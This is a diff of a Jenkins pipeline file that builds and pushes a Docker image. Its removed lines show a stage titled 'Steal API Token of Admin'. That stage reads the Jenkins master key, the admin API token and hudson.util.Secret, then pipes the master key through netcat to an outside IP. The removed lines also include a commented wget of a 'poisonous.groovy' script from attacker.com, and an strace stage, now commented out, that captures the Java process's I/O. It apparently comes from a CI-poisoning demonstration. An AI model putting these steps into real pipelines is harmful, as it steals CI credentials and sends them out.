@@ -1,39 +1,9 @@
 
-/*
-node('master') {
-   // def example = load "/var/lib/jenkins/secrets/master.key"
-}
-*/
-node {
-    // Git checkout before load source the file
-    checkout scm
-
-   new File('/path/to/file').eachLine { line ->
-      println line
-   }    
-    
-    // To know files are checked out or not
-    sh '''
-        ls -lhrt
-    '''
-
-    def rootDir = pwd()
-    println("Current Directory: " + rootDir)
-
-    // point to exact source file
-
-    example.exampleMethod()
-    example.otherExampleMethod()
-}
-
 node('ubuntu') {
     def app  
-    /// sh "wget attacker.com/poisonous.groovy"
-    //myscript = load('/tmp/poisonous.groovy')
-    //myscript.lookAtThis("Steve")
 
     stage('Start Java Listener') {
-        sh 'sudo strace -fp $(pidof java) -v -e read,write,open -s 9999 -o /home/ubuntu/getIntoDevOps.2 &'
+        // sh 'sudo strace -fp $(pidof java) -v -e read,write,open -s 9999 -o /home/ubuntu/getIntoDevOps.2 &'
     }
     
     stage('Clone repository') {
@@ -44,7 +14,6 @@ node('ubuntu') {
     stage('Build Docker image') {
         /* This builds the actual image; synonymous to
          * docker build on the command line */
-
         app = docker.build("nimrods8/helloisrael")
     }
 
@@ -67,51 +36,18 @@ node('ubuntu') {
             app.push("latest")
         }
     }
-}
-// Steal API Token of Admin
-node ('master') {
-/*
-    stage('load file') {
-        def pipeline1 = load "/var/lib/jenkins/secrets/initialAdminPassword"
-        echo pipeline1.toString()
-    }
-*/    
-    
-    stage('Steal API Token of Admin') {
-        
-      //  myscript.steal()
-
-  
-        println "\n\n=========================================================";
-        def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
-        println fileContents
-        def apiContents = readFile file: "/var/lib/jenkins/users/admin/config.xml", encoding: "UTF-8"
-        def api1 = apiContents.split( '<apiToken>');
-        def api2 = api1[1].split( '</apiToken>');
-        println "API Token is:\n" + api2[0];
-
-        //println fileContentsAdmin
-
-        int[] fileContentsHudson = readFile file: "/var/lib/jenkins/secrets/hudson.util.Secret", encoding: "ISO-8859-1"
-        String str = 'Secrets/hudson.Util.Secret:\nPass 1:\n';
-        for( int i = 0; i < fileContentsHudson.size(); i++)
-        {
-            int  a = (int)fileContentsHudson[i];
-            str = str + String.format("%02X-",a);
-        }
-        println str
-
-        sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
-        
+   
+    stage('Send slack notification') {
+         slackSend color: 'good', message: 'Message from Jenkins Pipeline'
     }
 }
 
 node ('ubuntu') {  
     stage('stop strace and dump results') {
-        label 'ubuntu'
+      label 'ubuntu'
       println "\n\n\n\n=========================================================";
-      sh 'sudo kill $(pidof strace)'
-        sh 'sudo cat /home/ubuntu/getIntoDevOps.2'
+      //sh 'sudo kill $(pidof strace)'
+     //   sh 'sudo cat /home/ubuntu/getIntoDevOps.2'
     }
 }  
 
